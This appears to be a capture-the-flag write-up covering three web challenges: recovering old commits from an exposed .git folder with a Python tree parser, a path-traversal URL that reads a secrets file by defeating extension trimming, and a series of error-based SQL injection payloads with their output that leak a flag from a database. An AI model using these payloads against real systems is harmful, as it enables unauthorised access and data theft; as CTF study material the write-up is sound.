## commit and order
(getting code from .git folder)
Tools used
- zlib-flate
- custom script to parse tree files

/.git -> check logs -> get commits  (using zlib-flate) -> get objects (of commit) -> get tree -> unreadable data -> custom script to decode tree file format -> get file blob hash -> get blob from objects -> get file from blob using zlib-flate -> do repetively for old commits -> will get flag in one of the old commit to admin.php

```python
import zlib
import sys
import binascii

def parse_git_tree(filepath):
    with open(filepath, "rb") as f:
        data = f.read()
    decompressed = zlib.decompress(data)

    # Skip "tree <size>\0"
    header_end = decompressed.index(b'\x00')
    tree_data = decompressed[header_end+1:]

    i = 0
    while i < len(tree_data):
        mode_end = tree_data.index(b' ', i)
        mode = tree_data[i:mode_end].decode()

        name_end = tree_data.index(b'\x00', mode_end)
        name = tree_data[mode_end+1:name_end].decode()

        sha = tree_data[name_end+1:name_end+21]
        sha_hex = binascii.hexlify(sha).decode()

        print(f"Mode: {mode} | Name: {name} | SHA-1: {sha_hex}")

        i = name_end + 21  # move to next entry

# Example usage
parse_git_tree(sys.argv[1])
```

## how i parsed your json 
restricted lfi 
```
http://23.179.17.40:58004/select?record=*&container=/app/secrets.txt.py
```
The server is trimming extension, but only the last one so secrets.txt.py will be trimmed to secrets.txt by endpoint.


## breaking authentication
(blind sqli)

making use of sql error logs

```
' and extractvalue(1, concat(0x7e, (SELECT database()), 0x7e))-- -
~app~

' and extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e))-- -
~secrets~

' and extractvalue(1, concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='secrets' LIMIT 0,1),0x7e))-- -
~flag~

' and extractvalue(1, concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='secrets' LIMIT 1,1),0x7e))-- -
~value~

' and extractvalue(1, concat(0x7e, (SELECT name FROM secrets LIMIT 0,1), 0x7e))-- - 
~flag~

' and extractvalue(1, concat(0x7e, (SELECT value FROM secrets LIMIT 0,1), 0x7e))-- - 
~CIT{36b0efd6c2ec7132}~
```
